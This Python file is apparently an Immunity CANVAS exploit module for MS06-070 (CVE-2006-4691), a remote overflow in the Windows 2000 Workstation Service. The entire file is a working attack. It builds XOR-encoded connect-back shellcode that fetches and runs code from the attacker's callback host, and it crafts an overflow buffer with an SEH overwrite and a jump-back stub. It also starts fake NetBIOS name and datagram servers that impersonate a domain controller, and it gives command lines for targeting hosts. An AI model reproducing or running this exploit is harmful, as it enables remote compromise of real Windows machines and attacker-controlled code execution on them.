#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append(".")
import socket
import time
import struct
from exploitutils import *
from msrpcexploit import msrpcexploit
from libs.newsmb.libdcerpc import s_dce_raw_unistring

# GUI info
NAME='Microsoft Workstation Service Overflow'
DESCRIPTION='Microsoft Workstation Service Overflow'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Date public']='11/14/2006'
DOCUMENTATION['References']='http://www.microsoft.com/technet/security/bulletin/ms06-070.mspx'
DOCUMENTATION['Platforms Tested']=''
DOCUMENTATION['Notes']='This exploit actually needs a domain reachable from the attacked machine'
DOCUMENTATION['CVE Name'] = 'CVE-2006-4691'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-4691'
DOCUMENTATION['CVSS'] = 10.0
VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000']
PROPERTY['MSADV']='MS06-070'
CHANGELOG="""
KK 03/15/07:
Now the sockets have to be bound to '' in order to receive the broadcast
messages. Weird.

KK 12/04/06:
This exploit has been updated to include a fake local Domain Controller. By
specifying -O usefakedc:1 on the commande line, or checking the appropriate
checkbox, the exploit will start two listeners on ports 137/udp and 138/udp
and reply to requests targetting our faked domain.

Works on a win32node if Netbios was deactivated on the given interface. Needs
root credentials on a Linux node to bind to those ports.
"""

NOTES="""
Tested on:
Windows 2000 Server SP3 English OOTB
Windows 2000 Advanced Server SP4 English UP2DATE
Windows 2000 Professional SP4 French UP2DATE
Windows 2000 Professional SP0 Japanese OOTB

Usage:
./commandlineInterface.py -p 5555 -v 1 -i fromcreatethread
./exploits/ms06_070/ms06_070.py -t 10.10.11.60 -v 1 -O domain:IMMUNITYINC -O usefakedc:1 -l 10.10.11.1 -d 5555
"""

TODO="""
-Initialize the threads in some other place than buildDcePacket! Where?
-Threads terminate when they have answered a good request, should they last more?
 Well at least they should not block the exploit termination
-Check NT4.0?
"""

targets={
    0: ['Autoversioning',0],
    1: ['Windows 2000 ALL',0x187533], #jmp ebx in some NLS file
}

class theexploit(msrpcexploit):
    def __init__(self):
        msrpcexploit.__init__(self)
        self.version        = 0
        self.badstring      = '\x00\xff'
        self.UUID           = u'6bffd098-a112-3610-9833-46c3f87e345a'
        self.uuidversion    = u'1.0'
        self.targetfunction = 22 #NetrJoinDomain2
        self.name           = NAME
        self.domain         = 'FOOBAR'
        self.controller     = 'DC-1'
        self.usefakedc      = 0
        self.timeout        = 10.0 #ten second timeout for the fake NBNS server
        self.listenerArgsDict['fromcreatethread'] =1

    def buildConnectionList(self):
        host=self.host
        connectionList=['ncacn_np:%s[\\wkssvc]'%(host),\
                        'ncacn_ip_tcp:%s[%d]'%(host,self.port),\
                        'ncacn_ip_tcp:%s[1026]'%host,\
                        'ncacn_ip_tcp:%s[1027]'%host,\
                        'ncacn_ip_tcp:%s[1028]'%host]
        connectionList+=self.searchifids()
        connectionList=uniquelist(connectionList)
        self.connectionList=connectionList
        return self.connectionList

    def testOS(self):
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)
        self.log('target=%s->%s'%(self.target,app.target))
        result=app.run()
        if result==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        if app.result.find('2000')>-1:
            self.version=1
            self.log('OS vulnerable: %s'%result)
            return 1
        else:
            self.log('OS not vulnerable: %s'%result)
        return 0

    def createShellcode(self):
        import shellcode.shellcodeGenerator as shellcodeGenerator
        sc=shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp',{'subespval':3000})
        sc.addAttr('revert_to_self_before_importing_ws2_32',None)
        sc.addAttr('tcpconnect',{'port': self.callback.port,'ipaddress':self.callback.ip})
        sc.addAttr('CreateThreadRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
        sc.addAttr('ExitThread', None)
        rawshellcode=sc.get()
        import encoder.xorencoder as xorencoder
        encoder=xorencoder.simpleXOR()
        encoder.setbadstring(self.badstring)
        ret=encoder.find_key(rawshellcode)
        if ret==0:
            self.log('Could not find a key for this shellcode!')
            raise Exception,'No shellcode generated'
        self.shellcode=encoder.encode(rawshellcode)
        if self.shellcode=='':
            raise Exception,'No shellcode generated'
        self.log('Xor key used: %x'%(encoder.getkey()))
        self.log('Length of shellcode=%s'%(len(self.shellcode)))
        return self.shellcode

    def encodeSMBname(self,decodedname):
        encodedname=''
        for i in range(len(decodedname)):
            b=ord(decodedname[i])
            encodedname+=chr(0x41+((b>>4)&0xf))
            encodedname+=chr(0x41+(b&0xf))
        return encodedname
            
    def decodeSMBname(self,encodedname):
        decodedname=''
        for i in range(0,len(encodedname),2):
            high,low=struct.unpack('BB',encodedname[i:i+2])
            decodedname+=chr(((high-0x41)<<4)+(low-0x41))
        return decodedname
        
    def fakeNBNSserver(self):
        domain=self.domain
        localhost=self.callback.ip
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.set_timeout(self.timeout)
        try:
            s.bind(('',137))
        except socket.error,err:
            raise Exception,'Couldn\'t bind on port 137/udp: %s'%(err)
        while True:
            try:
                request,address=s.recvfrom(1024)
            except timeoutsocket.Timeout:
                self.log('Fake NBNS server timed out without a connection')
                break
            if not request:
                break
            tid,flags,questions=struct.unpack('>HHH',request[:6])
            if flags!=0x110 or questions!=1:
                continue
            querylen=ord(request[12])
            if querylen!=32:
                continue
            encquery=struct.unpack('%ds'%querylen,request[13:13+querylen])[0]
            decquery=self.decodeSMBname(encquery)
            print prettyprint(decquery)
            if decquery[-1]!='\x1c': #domain controller
                continue
            if domain!=decquery[:len(domain)]:
                continue
            dcip=reduce(lambda x,y: long(x)*256+long(y),localhost.split('.'))
            data=struct.pack('>HL',0x8000,dcip)
            response=struct.pack('>HHHHHHB',tid,0x8500,0,1,0,0,len(encquery))
            response+=encquery+'\x00'
            response+=struct.pack('>HHLH',0x20,1,0x15180,len(data))
            response+=data
            s.sendto(response,address) #yes, we are the dc for this domain
            break
        s.close()
        return

    def buildLDAPdata(self):
        guid='\x00'*16
        domain=self.domain
        controller=self.controller
        localhost=self.callback.ip
        suffix='com'
        data=struct.pack('<LL',23,0x1fd)+guid
        offset1=len(data)
        data+=chr(len(domain))+string.lower(domain)+chr(len(suffix))+suffix+'\x00'
        data+=struct.pack('<BB',0xc0,offset1)
        data+=chr(len(controller))+string.lower(controller)+struct.pack('<BB',0xc0,offset1)
        data+=chr(len(domain))+domain+'\x00'
        data+=chr(len(controller))+controller+'\x00'
        data+='\x00'
        site='Default-First-Site'
        offset2=len(data)
        data+=chr(len(site))+site+'\x00'
        data+=struct.pack('<BB',0xc0,offset2)
        dcip=reduce(lambda x,y: long(x)*256+long(y),localhost.split('.'))
        subdata=struct.pack('<L',2)+struct.pack('>L',dcip)+struct.pack('<LL',0,0)
        data+=chr(len(subdata))+subdata
        data+=struct.pack('<LHH',13,0xffff,0xffff)
        return data

    def fakeNBDGMserver(self):
        domain=self.domain
        host=self.host
        localhost=self.callback.ip
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.set_timeout(self.timeout)
        #print localhost
        try:
            s.bind(('',138))
        except socket.error,err:
            raise Exception,'Couldn\'t bind on port 138/udp: %s'%(err)
        while True:
            try:
                request,address=s.recvfrom(1024)
            except timeoutsocket.Timeout:
                self.log('Fake NBDGM server timed out without a connection')
                break
            if not request:
                break
            msgtype,flags,did,srcip,srcport,lenpkt=struct.unpack('>BBHLHH',request[:12])
            if msgtype!=0x11 and flags!=0x02:
                continue
            srclen=ord(request[14])
            if srclen!=32:
                continue
            encsrc=struct.unpack('%ds'%srclen,request[15:15+srclen])[0]
            offset=14+1+srclen+1
            dstlen=ord(request[offset])
            if dstlen!=32:
                continue
            offset+=1
            encdst=struct.unpack('%ds'%dstlen,request[offset:offset+dstlen])[0]
            decdst=self.decodeSMBname(encdst)
            if decdst[-1]!='\x1c': #domain controller
                continue
            if domain!=decdst[:len(domain)]:
                continue
            offset+=dstlen+1
            if request[offset:offset+4]!='\xffSMB':
                continue
            #at that point, we are pretty sure that the packet is what we are expecting
            offset+=69 #SMB stuff, we won't check that
            while request[offset]!='\x00':
                offset+=1
            if request[offset+1]!='\x12': #SAM LOGON request
                continue
            offset=len(request)-18
            i=offset
            while request[i]!='\x00':
                i-=1
            mailslot=request[i+1:offset+2] #the last important thing to know!
            print prettyprint(mailslot)
            ldapdata=self.buildLDAPdata()
            srcip=reduce(lambda x,y: long(x)*256+long(y),localhost.split('.'))
            response=struct.pack('>BBHLHH',0x10,0x02,did+1,srcip,138,137+len(mailslot)+len(ldapdata))
            decdst=self.controller
            decdst+=' '*(15-len(decdst))+'\x00'
            encdst=self.encodeSMBname(decdst)
            response+=struct.pack('>HB',0,len(encdst))
            response+=encdst+'\x00'+chr(len(encsrc))+encsrc+'\x00'
            signature='\x00'*8
            response+='\xffSMB'+struct.pack('<BBBHBHH8sHHHHH',0x25,0,0,0,0,0,0,signature,0,0,0,0,0)
            response+=struct.pack('<BHHHHBBHLHHHHHBB',17,0,len(ldapdata),0,0,0,0,0,1000,0,0,0,len(ldapdata),69+len(mailslot),3,0)
            response+=struct.pack('<HHHH',1,1,2,len(mailslot)+len(ldapdata))
            response+=mailslot
            response+=ldapdata
            s.sendto(response,address)
            break
        s.close()
        return

    def getArgs(self):
        if(self.argsDict.get('silica')):
            self.usefakedc=1
        else:
            self.domain=self.argsDict.get('domain',self.domain)
            self.usefakedc=int(self.argsDict.get('usefakedc',self.usefakedc))
        return

    def buildDcePacket(self):
        description,ret=targets[self.version]
        self.getArgs()
        if self.usefakedc==1:
            print 'Using fake local Domain Controller'
            if len(self.domain)>15:
                raise Exception,'Fake domain name is too long!'
            import threading
            self.NBNSthread=threading.Thread(target=self.fakeNBNSserver)
            self.NBNSthread.start()
            self.NBDGMthread=threading.Thread(target=self.fakeNBDGMserver)
            self.NBDGMthread.start()
            time.sleep(1)
        domain=self.domain+'\\'
        data=''
        for i in range(len(domain)):
            data+=domain[i]+'\0' #turn domain to unicode
        data+='A'*(0x2cc+0xc) #overflow here
        data+='BBB\xff' #triggers an exception in a wcschr() call
        data+='CCCC'
        data+='DDDD' #such as &2==0 to go to the wcschr()
        data+=self.shellcode
        data+='E'*((0xd38-0x7d4)-len(self.shellcode))
        data+='\xeb\x06' #jmp over
        data+='FF'
        data+=struct.pack('<L',ret) #SEH
        from MOSDEF import mosdef
        data+=mosdef.assemble('jmp $-%d'%(0xd38-0x7d4+8+5),'X86') #jmp back
        if len(data)%2==1:
            data+='G' #pad to even length
        packet=intel_order(0) #null
        packet+=s_dce_raw_unistring(data) #DOMAIN\MACHINE
        packet+=intel_order(0) #null
        packet+=intel_order(0) #null
        packet+=intel_order(0) #null
        packet+=intel_order(1) #NETSETUP_JOIN_DOMAIN
        return packet

    def displayVersions(self):
        i=0
        for listline in targets.values():
            print '%d: %s'%(i,listline[0])
            i=i+1

if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
